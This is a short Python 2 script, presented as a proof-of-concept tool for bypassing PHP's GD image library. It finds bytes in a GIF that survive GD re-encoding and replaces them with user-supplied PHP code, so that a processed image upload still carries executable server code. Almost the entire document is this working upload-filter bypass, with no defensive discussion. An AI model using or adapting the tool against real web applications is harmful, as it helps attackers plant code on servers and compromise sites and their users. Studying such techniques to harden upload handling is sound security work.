#!/usr/bin/python
import argparse
code=''
name_of_your_file=""
def payload(stringToreplace,PoCcode,filename,old_gif):
		#! get the file name filename=old_gif
		f=open(old_gif,'r')
		filedata=f.read()
		f.close()
		print 'poccode' + PoCcode
		newdata = filedata.replace(stringToreplace,PoCcode)
		f = open(filename,'w')
		f.write(newdata)
		f.close()


def kompare(old_gif,new_gif,length):
	file1=new_gif
	file2=old_gif
	x=""
	i=0
	print "",length,"bytes"
	with open(file1,'rb') as f:
		with open(file2,'rb') as f1:
			while True:
				c=f.read(length)
				c1=f1.read(length)
				if not c:
					print"end of files"
					break
				elif c1==c:
					print'\n',c#.encode('hex')
					x=c
				
	print 'value of x(bytes to replace)',x
	payload(x,code,name_of_your_file,old_gif)



'''
BYPASS GD IMAGE LIBRARY OF PHP(PoC tool)
BYPASS GD IMAGE LIBRARY OF PHP(PoC tool)

'''



parser=argparse.ArgumentParser()
parser.add_argument('old_gif',type=str,help='the original file to compare')
parser.add_argument('new_gif',type=str,help='the GD image  file to compare')
parser.add_argument('phpcode',type=str,help='your PoC php code',default='<?phpinfo()?>')
parser.add_argument('fileName',type=str,help='name of the output file')
args=parser.parse_args()
a=args.old_gif
b=args.new_gif
code=args.phpcode
l=len(code.encode('hex'))
name_of_your_file=args.fileName
kompare(a,b,l)
print 'see ',name_of_your_file


